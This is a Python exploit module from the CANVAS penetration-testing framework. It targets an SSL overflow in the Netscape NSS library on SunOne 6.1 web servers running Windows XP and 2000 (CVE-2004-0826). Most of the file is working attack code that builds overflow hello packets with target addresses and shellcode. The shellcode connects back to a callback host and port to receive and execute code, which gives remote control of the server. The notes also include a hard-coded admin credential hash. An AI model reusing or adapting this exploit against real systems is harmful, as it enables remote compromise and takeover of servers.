#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2006 
#http://www.immunityinc.com/CANVAS/ for more information

"""
NSS: Netscape Library
"""

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket,struct
import time

if "." not in sys.path: 
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit

# GUI info
NAME="NSS overflow"
DESCRIPTION="Netscape NSS Library Remote Compromise"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Mozilla"
DOCUMENTATION["Date public"]=" 23 of August, 2004"
DOCUMENTATION["References"]="http://www.osvdb.org/displayvuln.php?osvdb_id=9116"
DOCUMENTATION["Vulnerable"]="NSS Library prior to 3.9.2"
DOCUMENTATION["CVE Name"] = "CVE-2004-0826"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0826"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"], ["_Solaris"] ]
PROPERTY['VERSION'] = [ "2000", "XP"]

GTK2_DIALOG="dialog.glade2"

NOTES="""      
Useful breakpoint: 0x32f000, that correspond to the function ssl_CopySecurityInfo
(on sslcon.c), that is where the overwrited socket is written to, and the owned 
function pointer triggered

[...]
    if (os->sec.hash && os->sec.hashcx) {
        ss->sec.hash            = os->sec.hash;
        ss->sec.hashcx          = os->sec.hash->clone(os->sec.hashcx);
[...]

If you ever lost your website administration password, you need to modify the 
administration password file located at:
    c:\Sun\WebServer6.1\https-admserv\config\
    If you dont want to create a new one, here is the one that i use (u: admin p: admin)
admin:{SHA}0DPiKuNIrrVmD8IUCuw1hQxNqZc=


"""

SUNONEWIN32=1
SUNONEWIN32_2K=2
targets = {
    0 : ["N/A", 0,0x0],
    SUNONEWIN32 : ["SunOne 6.1 Win32 XP Service Pack Independant", 0, 0x4B21D89B],    # this would be enough
    SUNONEWIN32_2K : ["SunOne 6.1 Win32 2000", 0, 0x4B21D89B],    # this would be enough
    }


class SunoneWin32(tcpexploit): # XP
    def __init__(self):
        pass

    def dorun(self):
        self.setInfo("%s attacking SunOne %s:%d XP (in progress)" % (NAME,self.host, self.port), showlog=True)
        
        # Its a one shot exploit, but you need to send two hello packet to get your
        # shellcode to execute
        self.exploit() # first overwrite
        
        self.exploit() # second trigger
        self.setInfo("%s attacking SunOne %s:%d (done)" % (NAME,self.host, self.port), showlog=True)
        
        
    def exploit(self):
        #s=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s = self.gettcpsock()
        self.log("Sending attack to %s:%s"%(self.host,self.port))
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect...")
            return 0
        buf=self.createHello()
        s.send(buf)
        s.close()
        return 1

    def createHello(self):
        from MOSDEF import mosdef
        data="A"* (215 +8)
        data+=mosdef.assemble("jmp $0x60", "X86")+ "\xcc"*0x1e 

        # this zero dword allows to avoid CERT_DupCertificate
        data+= struct.pack("<L", 0x0)#0x48)
        data+= "C" * 0x14
        data+= struct.pack("<L", targets[self.version][2]-8 )
        data+="A" * (0x800-len(data) - len(self.shellcode))
        data+=self.shellcode
        # SSl size flag: if first bit is set (2 bytes long), else 3 bytes.
        buf="\x88\x0c\x01\x00\x02\x00\x00\x00\x03" + struct.pack(">H", len(data))
        buf+="\x07\x00\xc0" + data
        return buf

class SunoneWin32_2k(tcpexploit):
    def __init__(self):
        pass

    def dorun2k(self):
        self.setInfo("%s attacking SunOne %s:%d (in progress)" % (NAME,self.host, self.port), showlog=True)
        # Its a one shot exploit (not bug), but you need to send two hello packet to get your
        # shellcode to execute

        self.exploit2k() # first overwrite
        self.exploit2k() # first overwrite
        self.log("Trigger the bug")
        self.trigger()
        self.setInfo("%s attacking SunOne %s:%d (done)" % (NAME,self.host, self.port), showlog=True)

        
    def exploit2k(self):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.log("Sending attack to %s:%s"%(self.host,self.port))
        s.connect((self.host, self.port))
        buf=self.createHello2k()
        s.send(buf)
        #s.close()

    def trigger(self):
        import urllib
        #d=urllib.urlopen("http://10.10.10.8")
        extension=[]
        time.sleep(3)
        for a in range(0,1):
            #s=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            self.log("Sending attack to %s:%s"%(self.host,self.port))
            #s.connect(self.host, 81)
            #s.send("OPTIONS / HTTP/1.0\n\n\n")
            params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': 0})
            f = urllib.urlopen("http://%s:%d/query?%s" % (self.host, 81, params))
            #d=urllib.urlopen("http://%s:%d/test.asp" % (self.host, 81))
            f.readlines()
            #d.close()
            f.close()
            
    def createHello2k(self):
        data="\x08"* (215) + struct.pack("<HHHH", 0x10, 0x10, 0x4141, 0x4141)
        data+=struct.pack("<L", 0x403000) + struct.pack("<L", 0x25D8Fd184)

        # this zero dword is allows to avoid CERT_DupCertificate
        data+= struct.pack("<L", 0x48)
        
        #data+="A" * 0x1E*4 + "BBBB"
        data += struct.pack("<L", 0x405000) * (0x6c/4) +"\x41"*8 
        data += struct.pack("<L", 0x403000) + struct.pack("<L", 0x42424242)
        data +="@" * (0x800-len(data) - len(self.shellcode))
        
        data+=self.shellcode
        # SSl size flag: if first bit is set (2 bytes long), else 3 bytes.
        buf="\x88\x0c\x01\x00\x02\x00\x00\x00\x03" + struct.pack(">H", len(data))
        buf+="\x07\x00\xc0" + data
        return buf
    
class theexploit(tcpexploit, SunoneWin32, SunoneWin32_2k):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 443
        self.host = "10.10.10.3"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.setVersion(0)
        self.badstring = ""
        self.myDCE = None
        self.name=NAME
        return
    
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.getarg("version")
        
        if self.version==0:
            self.test()
            if self.version==0:
                self.log("Could not find version - no shellcode created")
                return ""
        if self.version == SUNONEWIN32 or self.version == SUNONEWIN32_2K:
            self.remoteport = port       
            from shellcode import shellcodeGenerator
            #sc = shellcodeGenerator.win32()         
            #sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            #sc.addAttr("initstackswap", None)
            #sc.addAttr("stackSwap", None)
            #self.shellcode = sc.get()
            #encoder = chunkedaddencoder.intelchunkedaddencoder()
            #encoder.setbadstring(self.badstring)
            #self.log("Encoding shellcode")
            #self.shellcode = encoder.encode(self.shellcode)
            #if self.shellcode == "":
            #    self.log("Problem encoding shellcode")
            #    return 0

            # MOSDEF
            sc = shellcodeGenerator.win32()
            self.log("Generating shellcode with port %s and ip %s"%(port,host))
            sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            self.shellcode = sc.get()
            self.log("Raw win32 shellcode length: %d"%len(self.shellcode))

        return self.shellcode
    
    def test(self):        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s = self.gettcpsock()
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])
        try:
            s.connect( (self.host, self.port))
        except socket.error:
            return 0
        s.close()
        return 1
    
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict["port"])
        if self.version == SUNONEWIN32:
            print "XP"
            SunoneWin32.__init__(self)
            self.dorun()
        elif self.version == SUNONEWIN32_2K:
            SunoneWin32_2k.__init__(self)
            self.dorun2k()
            
    def displayVersions(self):
        for a in targets.keys():
            print "\t(%d) %s" % (a, targets[a][0])
    
if __name__== '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

